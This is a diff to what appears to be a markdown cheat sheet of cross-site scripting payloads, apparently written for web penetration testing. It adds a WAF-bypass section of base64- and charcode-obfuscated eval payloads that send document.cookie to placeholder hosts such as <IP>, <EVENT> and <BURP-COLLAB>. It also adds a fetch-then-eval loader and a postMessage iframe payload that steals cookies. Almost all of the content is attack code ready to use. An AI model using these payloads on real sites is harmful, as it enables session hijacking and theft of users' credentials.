@@ -8,7 +8,8 @@
       - [POC-COOKIE-STEALER](#poc-cookie-stealer)
       - [GENERIC-PAYLOADS-POC](#generic-payloads-poc)
       - [BYPASS-RESTRICTIONS](#bypass-restrictions)
-      - [COOKIE-STEALER](#cookie-stealer)
+      - [COOKIE-STEALER](#cookie-stealer) 🍪
+      - [WAF BYPASS](#waf-bypass) 🏃‍♂️‍➡️
       - [DATA-STEALER](#data-stealer)
       - [SVG-TAGS](#svg-tags)
       - [DOM-POST-MESSAGES](#dom-post-messages)
@@ -175,18 +176,37 @@ mode: 'no-cors',
 body:document.cookie
 });
 </script>
+```
 
+#### WAF-BYPASS
 
-
-// WAF BYPASS
 <script>eval(atob('YWxlcnQoMSk='));</script>  // POC alert(1)
+
 <script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQo='));</script> // POC alert(document.cookie)
 // CHANGE B64 FOR EACH SNIPPET TO STEAL COOKIE
 <script>eval(atob("ZmV0Y2goJ2h0dHBzOi8vPEVWRU5UPi8/Yz0nK2J0b2EoZG9jdW1lbnQuY29va2llKSk="))</script>
 
 <script>document.location="http://<IP>/?cookie="+eval(atob("ZmV0Y2goJ2h0dHBzOi8vPEVWRU5UPi8/Yz0nK2J0b2EoZG9jdW1lbnQuY29va2llKSk="))"</script>
+```bash
+
+
+```js
+javascript:eval(atob("")) <-- inyect in B64 the payload from below
+
+fetch('https://<IP>/?c='+document.cookie).then(r=>r.text()).then(eval)
+```
+
+```js
+
+echo -n "alert(1)" | python3 -c "import sys; print(','.join(str(ord(c)) for c in sys.stdin.read()))"
+
+output: 97,108,101,114,116,40,49,41
+
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
 
 ```
+
+
 
 #### DATA-STEALER
 ```js
@@ -284,6 +304,12 @@ onload='this.contentWindow.postMessage("javascript:alert(0)//https://google.com"
 
 <iframe src="<IP>" onload="this.contentWindow.postMessage('<img src=0 onerror=alert(1)>', '*')"></iframe>
 <iframe src="https://<IP>/" onload="this.contentWindow.postMessage('<img src=0 onerror=fetch(`https://EXPLOIT-SV>/?cookie=`+btoa(document.cookie))>', '*')"></iframe>
+
+<iframe src="<IP>>/" 
+        onload="this.contentWindow.postMessage('<img src=x onerror=&quot;fetch(\'https://<BURP-COLLAB>/?cookie=\' + btoa(document.cookie))&quot;>', '*')">
+</iframe>
+
+
 ```
 
 #### SINKS-AND-SOURCES
